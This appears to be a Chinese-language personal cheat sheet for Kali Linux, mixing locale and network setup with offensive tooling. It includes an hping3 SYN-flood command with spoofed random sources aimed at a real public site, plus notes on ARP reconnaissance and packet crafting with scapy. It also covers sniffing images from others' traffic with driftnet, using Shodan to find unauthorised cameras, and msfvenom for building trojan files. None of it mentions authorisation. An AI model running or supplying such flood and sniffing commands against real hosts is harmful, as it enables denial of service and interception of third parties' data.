# Kali Linux

## 中文乱码问题
确定locales已经安装，用”apt-get install locales”命令；之后可用”locale -a”查看当前系统支持的字符集。

1. 在命令行输入”dpkg-reconfigure locales”。进入图形化界面之后，（空格是选择，Tab是切换，*是选中），选中en_US.UTF-8和zh_CN.UTF-8，确定后，将en_US.UTF-8选为默认。
2. 安装中文字体，”apt-get install xfonts-intl-chinese “和” apt-get install ttf-wqy-microhei”，这时发现网页不乱码，系统也不乱码。
3. 重启 。

## DDOS 洪水攻击
```
hping3 -c 1000 -d 120 -S -w 64 -p80 --flood --rand-source baidu.com

-c: 发送包的数量
-d: 发送的每个数据包的大小,单位字节
-S: 只发送SYN数据包
-w: tcp窗口大小
-p: 目标端口
-flood: 尽可能快的发送数据包,不考虑显示入站回复
--rand-source: 随机性源头IP, 这里伪造的IP只是在局域网伪造,外网出口会还原
```

## 主动收集

### netdiscover
netdiscover 是一个主动/被动侦察工具. 可以扫描IP地址,检查在线主机或搜索为它们发送ARP请求

主动模式: 主动探测发现网络主机,但这种方式往往会引起网络管理员注意.

```
netdiscover -i eth0 -r 192.168.1.0/24
```

被动模式: 
```
netdiscover -p
```
### scapy
启动 `scapy` 

```
ARP().display() # 查看ARP函数的用法
###[ ARP ]###
hwsrc: 源MAC地址
psrc: 源IP地址
hwdst: 目标MAC地址
pdst: 目的IP地址
```

sr1 函数发送请求  
sr1(ARP(pdst='192.168.1.1')) # 发送ARP请求

使用IP()和ICMP()生成ping包.

思路: 
1. 修改IP包头的dst(目的地址)
2. 拼接ICMP的数据包类型
3. 使用sr1进行发送数据包并接收数据包

```python
sr1(IP(dst='192.168.1.1')/ICMP(),timeout=1)
```

* 构造TCP协议数据包

* 构造UDP协议数据包

### 僵尸扫描

nmap 扫描网络中的哪些机器可以被当成僵尸主机


## 被动收集

### 域名IP查询

dig (选项) 域名
```
@DNS服务地址: 指定域名进行解析
any: 显示所有类型域名记录.默认只显示A记录

dig yangb.xyz
dig @114.114.114.114 yangb.xyz
dig @114.114.114.114 yangb.xyz any

-x ip:反查域名
```

### 子域名信息收集

使用搜索引擎: site:顶级域名 例如: site:qq.com

### Maltego 收集子域名(更加专业强大)
学习视频:
<iframe height='309' width='500' src="//player.bilibili.com/player.html?aid=61881006&bvid=BV1Kt411u73T&cid=122929540&page=10" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

http://www.shodan.io/ 超强搜索引擎, 可以搜索未经授权的站点, 包括网络摄像头.


## Kali 网络配置

实用Kali虚拟机需要开启桥接模式。
修改`/etc/network/interfaces`文件

dhcp 自动获取ip地址
```
auto eth0
iface eth0 dhcp
```

手动IP设置
```
auto eth0
iface eth0 inet static
address 192.168.10.188
netmask 255.255.255.0
gateway 192.168.10.1
```

重启网络服务

```sh
/etc/init.d/networking restart
```


## 网络中图片嗅探
driftnet [options] [filter code]

```
主要参数：

-b 捕获到新的图片时发出嘟嘟声

-i interface 选择监听接口

-f file 读取一个指定pcap数据包中的图片

-p 不让所监听的接口使用混杂模式

-a 后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）

-m number 指定保存图片数的数目

-d directory 指定保存图片的路径

-x prefix 指定保存图片的前缀名

使用举例：

1.实时监听： driftnet -i wlan0

2.读取一个指定pcap数据包中的图片： driftnet -f /home/linger/backup/ap.pcapng -a -d /root/drifnet/

```

## Installing the Metasploit Framework on Linux

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

如果安装失败
```
apt-get update
```

如果update出现key错误,先添加key
```
apt-key adv --recv-keys --keyserver keyserver.ubuntu.com CDFB5FA52007B954
```

## msfvenom 使用

<https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>

查看能生成木马文件的格式类型,编码类型等等,都可以用-l参数来显示
```
msfvenom -l formats
```